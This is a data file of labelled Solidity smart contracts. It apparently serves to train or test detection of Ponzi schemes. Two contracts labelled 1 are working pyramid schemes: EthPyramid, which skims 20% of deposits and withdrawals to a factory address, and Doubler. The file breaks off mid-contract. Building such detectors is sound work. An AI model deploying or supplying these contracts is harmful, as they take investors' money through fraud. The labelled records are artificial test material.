{"code":"pragma solidity ^0.4.18;\r\r\n \r\r\n\/\/Inspired by https:\/\/test.jochen-hoenicke.de\/eth\/ponzitoken\/\r\r\n\r\r\ncontract EthPyramid {\r\r\n    address factory;\r\r\n\r\r\n\t\/\/ scaleFactor is used to convert Ether into tokens and vice-versa: they&#39;re of different\r\r\n\t\/\/ orders of magnitude, hence the need to bridge between the two.\r\r\n\tuint256 constant scaleFactor = 0x10000000000000000;  \/\/ 2^64\r\r\n\r\r\n\t\/\/ CRR = 50%\r\r\n\t\/\/ CRR is Cash Reserve Ratio (in this case Crypto Reserve Ratio).\r\r\n\t\/\/ For more on this: check out https:\/\/en.wikipedia.org\/wiki\/Reserve_requirement\r\r\n\tint constant crr_n = 1; \/\/ CRR numerator\r\r\n\tint constant crr_d = 2; \/\/ CRR denominator\r\r\n\r\r\n\t\/\/ The price coefficient. Chosen such that at 1 token total supply\r\r\n\t\/\/ the amount in reserve is 0.5 ether and token price is 1 Ether.\r\r\n\tint constant price_coeff = -0x296ABF784A358468C;\r\r\n\r\r\n\t\/\/ Typical values that we have to declare.\r\r\n\tstring constant public name = \"EthPyramid\";\r\r\n\tstring constant public symbol = \"EPY\";\r\r\n\tuint8 constant public decimals = 18;\r\r\n\r\r\n\t\/\/ Array between each address and their number of tokens.\r\r\n\tmapping(address => uint256) public tokenBalance;\r\r\n\t\t\r\r\n\t\/\/ Array between each address and how much Ether has been paid out to it.\r\r\n\t\/\/ Note that this is scaled by the scaleFactor variable.\r\r\n\tmapping(address => int256) public payouts;\r\r\n\r\r\n\t\/\/ Variable tracking how many tokens are in existence overall.\r\r\n\tuint256 public totalSupply;\r\r\n\r\r\n\t\/\/ Aggregate sum of all payouts.\r\r\n\t\/\/ Note that this is scaled by the scaleFactor variable.\r\r\n\tint256 totalPayouts;\r\r\n\r\r\n\t\/\/ Variable tracking how much Ether each token is currently worth.\r\r\n\t\/\/ Note that this is scaled by the scaleFactor variable.\r\r\n\tuint256 earningsPerToken;\r\r\n\t\r\r\n\t\/\/ Current contract balance in Ether\r\r\n\tuint256 public contractBalance;\r\r\n\r\r\n\tfunction EthPyramid(address _factory) public {\r\r\n          factory = _factory;\r\r\n        }\r\r\n\r\r\n\t\/\/ The following functions are used by the front-end for display purposes.\r\r\n\r\r\n\t\/\/ Returns the number of tokens currently held by _owner.\r\r\n\tfunction balanceOf(address _owner) public constant returns (uint256 balance) {\r\r\n\t\treturn tokenBalance[_owner];\r\r\n\t}\r\r\n\r\r\n\t\/\/ Withdraws all dividends held by the caller sending the transaction, updates\r\r\n\t\/\/ the requisite global variables, and transfers Ether back to the caller.\r\r\n\tfunction withdraw() public {\r\r\n\t\t\/\/ Retrieve the dividends associated with the address the request came from.\r\r\n\t\tvar balance = dividends(msg.sender);\r\r\n\t\t\r\r\n\t\t\/\/ Update the payouts array, incrementing the request address by `balance`.\r\r\n\t\tpayouts[msg.sender] += (int256) (balance * scaleFactor);\r\r\n\t\t\r\r\n\t\t\/\/ Increase the total amount that&#39;s been paid out to maintain invariance.\r\r\n\t\ttotalPayouts += (int256) (balance * scaleFactor);\r\r\n\t\t\r\r\n\t\t\/\/ Send the dividends to the address that requested the withdraw.\r\r\n\t\tcontractBalance = sub(contractBalance, balance);\r\r\n        var withdrawalFee = div(balance,5);\r\r\n        factory.transfer(withdrawalFee);\r\r\n        var balanceMinusWithdrawalFee = sub(balance,withdrawalFee);\r\r\n\t\tmsg.sender.transfer(balanceMinusWithdrawalFee);\r\r\n\t}\r\r\n\r\r\n\t\/\/ Converts the Ether accrued as dividends back into EPY tokens without having to\r\r\n\t\/\/ withdraw it first. Saves on gas and potential price spike loss.\r\r\n\tfunction reinvestDividends() public {\r\r\n\t\t\/\/ Retrieve the dividends associated with the address the request came from.\r\r\n\t\tvar balance = dividends(msg.sender);\r\r\n\t\t\r\r\n\t\t\/\/ Update the payouts array, incrementing the request address by `balance`.\r\r\n\t\t\/\/ Since this is essentially a shortcut to withdrawing and reinvesting, this step still holds.\r\r\n\t\tpayouts[msg.sender] += (int256) (balance * scaleFactor);\r\r\n\t\t\r\r\n\t\t\/\/ Increase the total amount that&#39;s been paid out to maintain invariance.\r\r\n\t\ttotalPayouts += (int256) (balance * scaleFactor);\r\r\n\t\t\r\r\n\t\t\/\/ Assign balance to a new variable.\r\r\n\t\tuint value_ = (uint) (balance);\r\r\n\t\t\r\r\n\t\t\/\/ If your dividends are worth less than 1 szabo, or more than a million Ether\r\r\n\t\t\/\/ (in which case, why are you even here), abort.\r\r\n\t\tif (value_ < 0.000001 ether || value_ > 1000000 ether)\r\r\n\t\t\trevert();\r\r\n\t\t\t\r\r\n\t\t\/\/ msg.sender is the address of the caller.\r\r\n\t\tvar sender = msg.sender;\r\r\n\t\t\r\r\n\t\t\/\/ A temporary reserve variable used for calculating the reward the holder gets for buying tokens.\r\r\n\t\t\/\/ (Yes, the buyer receives a part of the distribution as well!)\r\r\n\t\tvar res = reserve() - balance;\r\r\n\r\r\n\t\t\/\/ 10% of the total Ether sent is used to pay existing holders.\r\r\n\t\tvar fee = div(value_, 10);\r\r\n\t\t\r\r\n\t\t\/\/ The amount of Ether used to purchase new tokens for the caller.\r\r\n\t\tvar numEther = value_ - fee;\r\r\n\t\t\r\r\n\t\t\/\/ The number of tokens which can be purchased for numEther.\r\r\n\t\tvar numTokens = calculateDividendTokens(numEther, balance);\r\r\n\t\t\r\r\n\t\t\/\/ The buyer fee, scaled by the scaleFactor variable.\r\r\n\t\tvar buyerFee = fee * scaleFactor;\r\r\n\t\t\r\r\n\t\t\/\/ Check that we have tokens in existence (this should always be true), or\r\r\n\t\t\/\/ else you&#39;re gonna have a bad time.\r\r\n\t\tif (totalSupply > 0) {\r\r\n\t\t\t\/\/ Compute the bonus co-efficient for all existing holders and the buyer.\r\r\n\t\t\t\/\/ The buyer receives part of the distribution for each token bought in the\r\r\n\t\t\t\/\/ same way they would have if they bought each token individually.\r\r\n\t\t\tvar bonusCoEff =\r\r\n\t\t\t    (scaleFactor - (res + numEther) * numTokens * scaleFactor \/ (totalSupply + numTokens) \/ numEther)\r\r\n\t\t\t    * (uint)(crr_d) \/ (uint)(crr_d-crr_n);\r\r\n\t\t\t\t\r\r\n\t\t\t\/\/ The total reward to be distributed amongst the masses is the fee (in Ether)\r\r\n\t\t\t\/\/ multiplied by the bonus co-efficient.\r\r\n\t\t\tvar holderReward = fee * bonusCoEff;\r\r\n\t\t\t\r\r\n\t\t\tbuyerFee -= holderReward;\r\r\n\r\r\n\t\t\t\/\/ Fee is distributed to all existing token holders before the new tokens are purchased.\r\r\n\t\t\t\/\/ rewardPerShare is the amount gained per token thanks to this buy-in.\r\r\n\t\t\tvar rewardPerShare = holderReward \/ totalSupply;\r\r\n\t\t\t\r\r\n\t\t\t\/\/ The Ether value per token is increased proportionally.\r\r\n\t\t\tearningsPerToken += rewardPerShare;\r\r\n\t\t}\r\r\n\t\t\r\r\n\t\t\/\/ Add the numTokens which were just created to the total supply. We&#39;re a crypto central bank!\r\r\n\t\ttotalSupply = add(totalSupply, numTokens);\r\r\n\t\t\r\r\n\t\t\/\/ Assign the tokens to the balance of the buyer.\r\r\n\t\ttokenBalance[sender] = add(tokenBalance[sender], numTokens);\r\r\n\t\t\r\r\n\t\t\/\/ Update the payout array so that the buyer cannot claim dividends on previous purchases.\r\r\n\t\t\/\/ Also include the fee paid for entering the scheme.\r\r\n\t\t\/\/ First we compute how much was just paid out to the buyer...\r\r\n\t\tvar payoutDiff  = (int256) ((earningsPerToken * numTokens) - buyerFee);\r\r\n\t\t\r\r\n\t\t\/\/ Then we update the payouts array for the buyer with this amount...\r\r\n\t\tpayouts[sender] += payoutDiff;\r\r\n\t\t\r\r\n\t\t\/\/ And then we finally add it to the variable tracking the total amount spent to maintain invariance.\r\r\n\t\ttotalPayouts    += payoutDiff;\r\r\n\t\t\r\r\n\t}\r\r\n\r\r\n\t\/\/ Sells your tokens for Ether. This Ether is assigned to the callers entry\r\r\n\t\/\/ in the tokenBalance array, and therefore is shown as a dividend. A second\r\r\n\t\/\/ call to withdraw() must be made to invoke the transfer of Ether back to your address.\r\r\n\tfunction sellMyTokens() public {\r\r\n\t\tvar balance = balanceOf(msg.sender);\r\r\n\t\tsell(balance);\r\r\n\t}\r\r\n\r\r\n\t\/\/ The slam-the-button escape hatch. Sells the callers tokens for Ether, then immediately\r\r\n\t\/\/ invokes the withdraw() function, sending the resulting Ether to the callers address.\r\r\n    function getMeOutOfHere() public {\r\r\n\t\tsellMyTokens();\r\r\n        withdraw();\r\r\n\t}\r\r\n\r\r\n\t\/\/ Gatekeeper function to check if the amount of Ether being sent isn&#39;t either\r\r\n\t\/\/ too small or too large. If it passes, goes direct to buy().\r\r\n\tfunction fund() payable public {\r\r\n\t\t\/\/ Don&#39;t allow for funding if the amount of Ether sent is less than 1 szabo.\r\r\n\t\tif (msg.value > 0.000001 ether) {\r\r\n            var factoryFee = div(msg.value,5);\r\r\n            factory.transfer(factoryFee);\r\r\n            var fundedAmount = sub(msg.value,factoryFee);\r\r\n\t\t    contractBalance = add(contractBalance, fundedAmount);\r\r\n\t\t\tbuy();\r\r\n\t\t} else {\r\r\n\t\t\trevert();\r\r\n\t\t}\r\r\n    }\r\r\n\r\r\n\t\/\/ Function that returns the (dynamic) price of buying a finney worth of tokens.\r\r\n\tfunction buyPrice() public constant returns (uint) {\r\r\n\t\treturn getTokensForEther(1 finney);\r\r\n\t}\r\r\n\r\r\n\t\/\/ Function that returns the (dynamic) price of selling a single token.\r\r\n\tfunction sellPrice() public constant returns (uint) {\r\r\n        var eth = getEtherForTokens(1 finney);\r\r\n        var fee = div(eth, 10);\r\r\n        return eth - fee;\r\r\n    }\r\r\n\r\r\n\t\/\/ Calculate the current dividends associated with the caller address. This is the net result\r\r\n\t\/\/ of multiplying the number of tokens held by their current value in Ether and subtracting the\r\r\n\t\/\/ Ether that has already been paid out.\r\r\n\tfunction dividends(address _owner) public constant returns (uint256 amount) {\r\r\n\t\treturn (uint256) ((int256)(earningsPerToken * tokenBalance[_owner]) - payouts[_owner]) \/ scaleFactor;\r\r\n\t}\r\r\n\r\r\n\t\/\/ Version of withdraw that extracts the dividends and sends the Ether to the caller.\r\r\n\t\/\/ This is only used in the case when there is no transaction data, and that should be\r\r\n\t\/\/ quite rare unless interacting directly with the smart contract.\r\r\n\tfunction withdrawOld(address to) public {\r\r\n\t\t\/\/ Retrieve the dividends associated with the address the request came from.\r\r\n\t\tvar balance = dividends(msg.sender);\r\r\n\t\t\r\r\n\t\t\/\/ Update the payouts array, incrementing the request address by `balance`.\r\r\n\t\tpayouts[msg.sender] += (int256) (balance * scaleFactor);\r\r\n\t\t\r\r\n\t\t\/\/ Increase the total amount that&#39;s been paid out to maintain invariance.\r\r\n\t\ttotalPayouts += (int256) (balance * scaleFactor);\r\r\n\t\t\r\r\n\t\t\/\/ Send the dividends to the address that requested the withdraw.\r\r\n\t\tcontractBalance = sub(contractBalance, balance);\r\r\n        var withdrawalFee = div(balance,5);\r\r\n        factory.transfer(withdrawalFee);\r\r\n        var balanceMinusWithdrawalFee = sub(balance,withdrawalFee);\r\r\n\t\tto.transfer(balanceMinusWithdrawalFee);\r\r\n\t}\r\r\n\r\r\n\t\/\/ Internal balance function, used to calculate the dynamic reserve value.\r\r\n\tfunction balance() internal constant returns (uint256 amount) {\r\r\n\t\t\/\/ msg.value is the amount of Ether sent by the transaction.\r\r\n\t\treturn contractBalance - msg.value;\r\r\n\t}\r\r\n\r\r\n\tfunction buy() internal {\r\r\n\t\t\/\/ Any transaction of less than 1 szabo is likely to be worth less than the gas used to send it.\r\r\n\t\tif (msg.value < 0.000001 ether || msg.value > 1000000 ether)\r\r\n\t\t\trevert();\r\r\n\t\t\t\t\t\t\r\r\n\t\t\/\/ msg.sender is the address of the caller.\r\r\n\t\tvar sender = msg.sender;\r\r\n\t\t\r\r\n\t\t\/\/ 10% of the total Ether sent is used to pay existing holders.\r\r\n\t\tvar fee = div(msg.value, 10);\r\r\n\t\t\r\r\n\t\t\/\/ The amount of Ether used to purchase new tokens for the caller.\r\r\n\t\tvar numEther = msg.value - fee;\r\r\n\t\t\r\r\n\t\t\/\/ The number of tokens which can be purchased for numEther.\r\r\n\t\tvar numTokens = getTokensForEther(numEther);\r\r\n\t\t\r\r\n\t\t\/\/ The buyer fee, scaled by the scaleFactor variable.\r\r\n\t\tvar buyerFee = fee * scaleFactor;\r\r\n\t\t\r\r\n\t\t\/\/ Check that we have tokens in existence (this should always be true), or\r\r\n\t\t\/\/ else you&#39;re gonna have a bad time.\r\r\n\t\tif (totalSupply > 0) {\r\r\n\t\t\t\/\/ Compute the bonus co-efficient for all existing holders and the buyer.\r\r\n\t\t\t\/\/ The buyer receives part of the distribution for each token bought in the\r\r\n\t\t\t\/\/ same way they would have if they bought each token individually.\r\r\n\t\t\tvar bonusCoEff =\r\r\n\t\t\t    (scaleFactor - (reserve() + numEther) * numTokens * scaleFactor \/ (totalSupply + numTokens) \/ numEther)\r\r\n\t\t\t    * (uint)(crr_d) \/ (uint)(crr_d-crr_n);\r\r\n\t\t\t\t\r\r\n\t\t\t\/\/ The total reward to be distributed amongst the masses is the fee (in Ether)\r\r\n\t\t\t\/\/ multiplied by the bonus co-efficient.\r\r\n\t\t\tvar holderReward = fee * bonusCoEff;\r\r\n\t\t\t\r\r\n\t\t\tbuyerFee -= holderReward;\r\r\n\r\r\n\t\t\t\/\/ Fee is distributed to all existing token holders before the new tokens are purchased.\r\r\n\t\t\t\/\/ rewardPerShare is the amount gained per token thanks to this buy-in.\r\r\n\t\t\tvar rewardPerShare = holderReward \/ totalSupply;\r\r\n\t\t\t\r\r\n\t\t\t\/\/ The Ether value per token is increased proportionally.\r\r\n\t\t\tearningsPerToken += rewardPerShare;\r\r\n\t\t\t\r\r\n\t\t}\r\r\n\r\r\n\t\t\/\/ Add the numTokens which were just created to the total supply. We&#39;re a crypto central bank!\r\r\n\t\ttotalSupply = add(totalSupply, numTokens);\r\r\n\r\r\n\t\t\/\/ Assign the tokens to the balance of the buyer.\r\r\n\t\ttokenBalance[sender] = add(tokenBalance[sender], numTokens);\r\r\n\r\r\n\t\t\/\/ Update the payout array so that the buyer cannot claim dividends on previous purchases.\r\r\n\t\t\/\/ Also include the fee paid for entering the scheme.\r\r\n\t\t\/\/ First we compute how much was just paid out to the buyer...\r\r\n\t\tvar payoutDiff = (int256) ((earningsPerToken * numTokens) - buyerFee);\r\r\n\t\t\r\r\n\t\t\/\/ Then we update the payouts array for the buyer with this amount...\r\r\n\t\tpayouts[sender] += payoutDiff;\r\r\n\t\t\r\r\n\t\t\/\/ And then we finally add it to the variable tracking the total amount spent to maintain invariance.\r\r\n\t\ttotalPayouts    += payoutDiff;\r\r\n\t\t\r\r\n\t}\r\r\n\r\r\n\t\/\/ Sell function that takes tokens and converts them into Ether. Also comes with a 10% fee\r\r\n\t\/\/ to discouraging dumping, and means that if someone near the top sells, the fee distributed\r\r\n\t\/\/ will be *significant*.\r\r\n\tfunction sell(uint256 amount) internal {\r\r\n\t    \/\/ Calculate the amount of Ether that the holders tokens sell for at the current sell price.\r\r\n\t\tvar numEthersBeforeFee = getEtherForTokens(amount);\r\r\n\t\t\r\r\n\t\t\/\/ 10% of the resulting Ether is used to pay remaining holders.\r\r\n        var fee = div(numEthersBeforeFee, 10);\r\r\n\t\t\r\r\n\t\t\/\/ Net Ether for the seller after the fee has been subtracted.\r\r\n        var numEthers = numEthersBeforeFee - fee;\r\r\n\t\t\r\r\n\t\t\/\/ *Remove* the numTokens which were just sold from the total supply. We&#39;re \/definitely\/ a crypto central bank.\r\r\n\t\ttotalSupply = sub(totalSupply, amount);\r\r\n\t\t\r\r\n        \/\/ Remove the tokens from the balance of the buyer.\r\r\n\t\ttokenBalance[msg.sender] = sub(tokenBalance[msg.sender], amount);\r\r\n\r\r\n        \/\/ Update the payout array so that the seller cannot claim future dividends unless they buy back in.\r\r\n\t\t\/\/ First we compute how much was just paid out to the seller...\r\r\n\t\tvar payoutDiff = (int256) (earningsPerToken * amount + (numEthers * scaleFactor));\r\r\n\t\t\r\r\n        \/\/ We reduce the amount paid out to the seller (this effectively resets their payouts value to zero,\r\r\n\t\t\/\/ since they&#39;re selling all of their tokens). This makes sure the seller isn&#39;t disadvantaged if\r\r\n\t\t\/\/ they decide to buy back in.\r\r\n\t\tpayouts[msg.sender] -= payoutDiff;\t\t\r\r\n\t\t\r\r\n\t\t\/\/ Decrease the total amount that&#39;s been paid out to maintain invariance.\r\r\n        totalPayouts -= payoutDiff;\r\r\n\t\t\r\r\n\t\t\/\/ Check that we have tokens in existence (this is a bit of an irrelevant check since we&#39;re\r\r\n\t\t\/\/ selling tokens, but it guards against division by zero).\r\r\n\t\tif (totalSupply > 0) {\r\r\n\t\t\t\/\/ Scale the Ether taken as the selling fee by the scaleFactor variable.\r\r\n\t\t\tvar etherFee = fee * scaleFactor;\r\r\n\t\t\t\r\r\n\t\t\t\/\/ Fee is distributed to all remaining token holders.\r\r\n\t\t\t\/\/ rewardPerShare is the amount gained per token thanks to this sell.\r\r\n\t\t\tvar rewardPerShare = etherFee \/ totalSupply;\r\r\n\t\t\t\r\r\n\t\t\t\/\/ The Ether value per token is increased proportionally.\r\r\n\t\t\tearningsPerToken = add(earningsPerToken, rewardPerShare);\r\r\n\t\t}\r\r\n\t}\r\r\n\t\r\r\n\t\/\/ Dynamic value of Ether in reserve, according to the CRR requirement.\r\r\n\tfunction reserve() internal constant returns (uint256 amount) {\r\r\n\t\treturn sub(balance(),\r\r\n\t\t\t ((uint256) ((int256) (earningsPerToken * totalSupply) - totalPayouts) \/ scaleFactor));\r\r\n\t}\r\r\n\r\r\n\t\/\/ Calculates the number of tokens that can be bought for a given amount of Ether, according to the\r\r\n\t\/\/ dynamic reserve and totalSupply values (derived from the buy and sell prices).\r\r\n\tfunction getTokensForEther(uint256 ethervalue) public constant returns (uint256 tokens) {\r\r\n\t\treturn sub(fixedExp(fixedLog(reserve() + ethervalue)*crr_n\/crr_d + price_coeff), totalSupply);\r\r\n\t}\r\r\n\r\r\n\t\/\/ Semantically similar to getTokensForEther, but subtracts the callers balance from the amount of Ether returned for conversion.\r\r\n\tfunction calculateDividendTokens(uint256 ethervalue, uint256 subvalue) public constant returns (uint256 tokens) {\r\r\n\t\treturn sub(fixedExp(fixedLog(reserve() - subvalue + ethervalue)*crr_n\/crr_d + price_coeff), totalSupply);\r\r\n\t}\r\r\n\r\r\n\t\/\/ Converts a number tokens into an Ether value.\r\r\n\tfunction getEtherForTokens(uint256 tokens) public constant returns (uint256 ethervalue) {\r\r\n\t\t\/\/ How much reserve Ether do we have left in the contract?\r\r\n\t\tvar reserveAmount = reserve();\r\r\n\r\r\n\t\t\/\/ If you&#39;re the Highlander (or bagholder), you get The Prize. Everything left in the vault.\r\r\n\t\tif (tokens == totalSupply)\r\r\n\t\t\treturn reserveAmount;\r\r\n\r\r\n\t\t\/\/ If there would be excess Ether left after the transaction this is called within, return the Ether\r\r\n\t\t\/\/ corresponding to the equation in Dr Jochen Hoenicke&#39;s original Ponzi paper, which can be found\r\r\n\t\t\/\/ at https:\/\/test.jochen-hoenicke.de\/eth\/ponzitoken\/ in the third equation, with the CRR numerator \r\r\n\t\t\/\/ and denominator altered to 1 and 2 respectively.\r\r\n\t\treturn sub(reserveAmount, fixedExp((fixedLog(totalSupply - tokens) - price_coeff) * crr_d\/crr_n));\r\r\n\t}\r\r\n\r\r\n\t\/\/ You don&#39;t care about these, but if you really do they&#39;re hex values for \r\r\n\t\/\/ co-efficients used to simulate approximations of the log and exp functions.\r\r\n\tint256  constant one        = 0x10000000000000000;\r\r\n\tuint256 constant sqrt2      = 0x16a09e667f3bcc908;\r\r\n\tuint256 constant sqrtdot5   = 0x0b504f333f9de6484;\r\r\n\tint256  constant ln2        = 0x0b17217f7d1cf79ac;\r\r\n\tint256  constant ln2_64dot5 = 0x2cb53f09f05cc627c8;\r\r\n\tint256  constant c1         = 0x1ffffffffff9dac9b;\r\r\n\tint256  constant c3         = 0x0aaaaaaac16877908;\r\r\n\tint256  constant c5         = 0x0666664e5e9fa0c99;\r\r\n\tint256  constant c7         = 0x049254026a7630acf;\r\r\n\tint256  constant c9         = 0x038bd75ed37753d68;\r\r\n\tint256  constant c11        = 0x03284a0c14610924f;\r\r\n\r\r\n\t\/\/ The polynomial R = c1*x + c3*x^3 + ... + c11 * x^11\r\r\n\t\/\/ approximates the function log(1+x)-log(1-x)\r\r\n\t\/\/ Hence R(s) = log((1+s)\/(1-s)) = log(a)\r\r\n\tfunction fixedLog(uint256 a) internal pure returns (int256 log) {\r\r\n\t\tint32 scale = 0;\r\r\n\t\twhile (a > sqrt2) {\r\r\n\t\t\ta \/= 2;\r\r\n\t\t\tscale++;\r\r\n\t\t}\r\r\n\t\twhile (a <= sqrtdot5) {\r\r\n\t\t\ta *= 2;\r\r\n\t\t\tscale--;\r\r\n\t\t}\r\r\n\t\tint256 s = (((int256)(a) - one) * one) \/ ((int256)(a) + one);\r\r\n\t\tvar z = (s*s) \/ one;\r\r\n\t\treturn scale * ln2 +\r\r\n\t\t\t(s*(c1 + (z*(c3 + (z*(c5 + (z*(c7 + (z*(c9 + (z*c11\/one))\r\r\n\t\t\t\t\/one))\/one))\/one))\/one))\/one);\r\r\n\t}\r\r\n\r\r\n\tint256 constant c2 =  0x02aaaaaaaaa015db0;\r\r\n\tint256 constant c4 = -0x000b60b60808399d1;\r\r\n\tint256 constant c6 =  0x0000455956bccdd06;\r\r\n\tint256 constant c8 = -0x000001b893ad04b3a;\r\r\n\t\r\r\n\t\/\/ The polynomial R = 2 + c2*x^2 + c4*x^4 + ...\r\r\n\t\/\/ approximates the function x*(exp(x)+1)\/(exp(x)-1)\r\r\n\t\/\/ Hence exp(x) = (R(x)+x)\/(R(x)-x)\r\r\n\tfunction fixedExp(int256 a) internal pure returns (uint256 exp) {\r\r\n\t\tint256 scale = (a + (ln2_64dot5)) \/ ln2 - 64;\r\r\n\t\ta -= scale*ln2;\r\r\n\t\tint256 z = (a*a) \/ one;\r\r\n\t\tint256 R = ((int256)(2) * one) +\r\r\n\t\t\t(z*(c2 + (z*(c4 + (z*(c6 + (z*c8\/one))\/one))\/one))\/one);\r\r\n\t\texp = (uint256) (((R + a) * one) \/ (R - a));\r\r\n\t\tif (scale >= 0)\r\r\n\t\t\texp <<= scale;\r\r\n\t\telse\r\r\n\t\t\texp >>= -scale;\r\r\n\t\treturn exp;\r\r\n\t}\r\r\n\t\r\r\n\t\/\/ The below are safemath implementations of the four arithmetic operators\r\r\n\t\/\/ designed to explicitly prevent over- and under-flows of integer values.\r\r\n\r\r\n\tfunction mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\r\n\t\tif (a == 0) {\r\r\n\t\t\treturn 0;\r\r\n\t\t}\r\r\n\t\tuint256 c = a * b;\r\r\n\t\tassert(c \/ a == b);\r\r\n\t\treturn c;\r\r\n\t}\r\r\n\r\r\n\tfunction div(uint256 a, uint256 b) internal pure returns (uint256) {\r\r\n\t\t\/\/ assert(b > 0); \/\/ Solidity automatically throws when dividing by 0\r\r\n\t\tuint256 c = a \/ b;\r\r\n\t\t\/\/ assert(a == b * c + a % b); \/\/ There is no case in which this doesn&#39;t hold\r\r\n\t\treturn c;\r\r\n\t}\r\r\n\r\r\n\tfunction sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\r\n\t\tassert(b <= a);\r\r\n\t\treturn a - b;\r\r\n\t}\r\r\n\r\r\n\tfunction add(uint256 a, uint256 b) internal pure returns (uint256) {\r\r\n\t\tuint256 c = a + b;\r\r\n\t\tassert(c >= a);\r\r\n\t\treturn c;\r\r\n\t}\r\r\n\r\r\n\t\/\/ This allows you to buy tokens by sending Ether directly to the smart contract\r\r\n\t\/\/ without including any transaction data (useful for, say, mobile wallet apps).\r\r\n\tfunction () payable public {\r\r\n\t\t\/\/ msg.value is the amount of Ether sent by the transaction.\r\r\n\t\tif (msg.value > 0) {\r\r\n\t\t\tfund();\r\r\n\t\t} else {\r\r\n\t\t\twithdrawOld(msg.sender);\r\r\n\t\t}\r\r\n\t}\r\r\n}","label":1}
{"code":"pragma solidity ^0.4.13;\r\r\n\r\r\ncontract EthereumLottery {\r\r\n    function admin() constant returns (address);\r\r\n    function needsInitialization() constant returns (bool);\r\r\n    function initLottery(uint _jackpot, uint _numTickets,\r\r\n                         uint _ticketPrice, int _durationInBlocks) payable;\r\r\n    function needsFinalization() constant returns (bool);\r\r\n    function finalizeLottery(uint _steps);\r\r\n}\r\r\n\r\r\ncontract LotteryAdmin {\r\r\n    address public owner;\r\r\n    address public admin;\r\r\n    address public proposedOwner;\r\r\n\r\r\n    address public ethereumLottery;\r\r\n\r\r\n    uint public dailyAdminAllowance;\r\r\n    uint public maximumJackpot;\r\r\n    int public minimumDurationInBlocks;\r\r\n\r\r\n    uint public lastAllowancePaymentTimestamp;\r\r\n    uint public nextProfile;\r\r\n\r\r\n    event Deposit(address indexed _from, uint _value);\r\r\n\r\r\n    modifier onlyOwner {\r\r\n        require(msg.sender == owner);\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    modifier onlyAdminOrOwner {\r\r\n        require(msg.sender == owner || msg.sender == admin);\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    function LotteryAdmin(address _ethereumLottery) {\r\r\n        owner = msg.sender;\r\r\n        admin = msg.sender;\r\r\n        ethereumLottery = _ethereumLottery;\r\r\n\r\r\n        dailyAdminAllowance = 50 finney;\r\r\n        maximumJackpot = 100 ether;\r\r\n        minimumDurationInBlocks = 6;\r\r\n    }\r\r\n\r\r\n    function () payable {\r\r\n        Deposit(msg.sender, msg.value);\r\r\n    }\r\r\n\r\r\n    function allowsAllowance() constant returns (bool) {\r\r\n        return now - lastAllowancePaymentTimestamp >= 24 hours;\r\r\n    }\r\r\n\r\r\n    function requestAllowance() onlyAdminOrOwner {\r\r\n        require(allowsAllowance());\r\r\n\r\r\n        lastAllowancePaymentTimestamp = now;\r\r\n        admin.transfer(dailyAdminAllowance);\r\r\n    }\r\r\n\r\r\n    function needsAdministration() constant returns (bool) {\r\r\n        if (EthereumLottery(ethereumLottery).admin() != address(this)) {\r\r\n            return false;\r\r\n        }\r\r\n\r\r\n        return EthereumLottery(ethereumLottery).needsFinalization();\r\r\n    }\r\r\n\r\r\n    function administrate(uint _steps) onlyAdminOrOwner {\r\r\n        EthereumLottery(ethereumLottery).finalizeLottery(_steps);\r\r\n    }\r\r\n\r\r\n    function needsInitialization() constant returns (bool) {\r\r\n        if (EthereumLottery(ethereumLottery).admin() != address(this)) {\r\r\n            return false;\r\r\n        }\r\r\n\r\r\n        return EthereumLottery(ethereumLottery).needsInitialization();\r\r\n    }\r\r\n\r\r\n    function initLottery(uint _nextProfile,\r\r\n                         uint _jackpot, uint _numTickets,\r\r\n                         uint _ticketPrice, int _durationInBlocks)\r\r\n             onlyAdminOrOwner {\r\r\n        require(_jackpot <= maximumJackpot);\r\r\n        require(_durationInBlocks >= minimumDurationInBlocks);\r\r\n\r\r\n        nextProfile = _nextProfile;\r\r\n        EthereumLottery(ethereumLottery).initLottery.value(_jackpot)(\r\r\n            _jackpot, _numTickets, _ticketPrice, _durationInBlocks);\r\r\n    }\r\r\n\r\r\n    function withdraw(uint _value) onlyOwner {\r\r\n        owner.transfer(_value);\r\r\n    }\r\r\n\r\r\n    function setConfiguration(uint _dailyAdminAllowance,\r\r\n                              uint _maximumJackpot,\r\r\n                              int _minimumDurationInBlocks)\r\r\n             onlyOwner {\r\r\n        dailyAdminAllowance = _dailyAdminAllowance;\r\r\n        maximumJackpot = _maximumJackpot;\r\r\n        minimumDurationInBlocks = _minimumDurationInBlocks;\r\r\n    }\r\r\n\r\r\n    function setLottery(address _ethereumLottery) onlyOwner {\r\r\n        ethereumLottery = _ethereumLottery;\r\r\n    }\r\r\n\r\r\n    function setAdmin(address _admin) onlyOwner {\r\r\n        admin = _admin;\r\r\n    }\r\r\n\r\r\n    function proposeOwner(address _owner) onlyOwner {\r\r\n        proposedOwner = _owner;\r\r\n    }\r\r\n\r\r\n    function acceptOwnership() {\r\r\n        require(proposedOwner != 0);\r\r\n        require(msg.sender == proposedOwner);\r\r\n        owner = proposedOwner;\r\r\n    }\r\r\n\r\r\n    function destruct() onlyOwner {\r\r\n        selfdestruct(owner);\r\r\n    }\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.24;\r\r\n\r\r\ncontract Doubler{\r\r\n    uint public price = 1 wei;\r\r\n    address public winner = msg.sender;\r\r\n    \r\r\n    function() public payable {\r\r\n        require(msg.value >= price); \r\r\n        if (msg.value > price){\r\r\n            msg.sender.transfer(msg.value - price);\r\r\n        }\r\r\n        if (!winner.send(price)){\r\r\n            msg.sender.transfer(price);\r\r\n        }\r\r\n        winner = msg.sender;\r\r\n        price = price * 2;\r\r\n    }\r\r\n    \r\r\n    \r\r\n}","label":1}
{"code":"pragma solidity ^0.4.15;\/** * @title SafeMath * @dev Math operations with safety checks that throw on error *\/library SafeMath { function mul(uint256 a, uint256 b) internal constant returns (uint256) { uint256 c = a * b; assert(a == 0 || c \/ a == b); return c; } function div(uint256 a, uint256 b) internal constant returns (uint256) { uint256 c = a \/ b; return c; } function sub(uint256 a, uint256 b) internal constant returns (uint256) { assert(b <= a); return a - b; } function add(uint256 a, uint256 b) internal constant returns (uint256) { uint256 c = a + b; assert(c >= a); return c; }}\/** * @title Ownable * @dev The Ownable contract has an owner address, and provides basic authorization control * functions, this simplifies the implementation of \"user permissions\". *\/contract Ownable { address public owner; \/** * @dev The Ownable constructor sets the original `owner` of the contract to the sender * account. *\/ function Ownable() { owner = msg.sender; } \/** * @dev Throws if called by any account other than the 